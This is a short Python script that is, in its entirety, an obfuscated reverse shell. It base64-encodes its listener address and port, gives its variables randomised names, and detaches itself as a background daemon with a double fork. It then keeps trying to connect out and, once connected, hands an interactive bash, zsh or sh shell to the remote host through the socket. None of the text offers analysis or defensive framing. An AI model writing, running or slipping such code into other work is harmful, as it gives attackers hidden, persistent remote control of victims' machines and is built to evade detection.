#!/usr/bin/env python3
import socket
import os
import time
import random
import string
import pty
import base64

# Random variable names for obfuscation
def _qwe123():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

_x9z = _qwe123()  # HOST
_p7q = _qwe123()  # PORT
_r4t = _qwe123()  # socket
_z2n = _qwe123()  # time

# Base64-encoded listener details
_obf_host = "MTkyLjE2OC4wLjEzOQ=="  # base64 of "192.168.0.139"
_obf_port = "NDQ0NA=="  # base64 of "4444"

# Decode at runtime
globals()[_x9z] = base64.b64decode(_obf_host).decode()
globals()[_p7q] = int(base64.b64decode(_obf_port).decode())

def _j5v():
    while True:
        try:
            globals()[_r4t] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            globals()[_r4t].connect((globals()[_x9z], globals()[_p7q]))
            _y6h = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/zsh" if os.path.exists("/bin/zsh") else "/bin/sh"
            os.dup2(globals()[_r4t].fileno(), 0)
            os.dup2(globals()[_r4t].fileno(), 1)
            os.dup2(globals()[_r4t].fileno(), 2)
            pty.spawn([_y6h, "-i"])
        except:
            globals()[_z2n] = time.sleep(10)

# Daemonize
if os.fork() > 0:
    os._exit(0)
os.setsid()
if os.fork() > 0:
    os._exit(0)

_j5v()
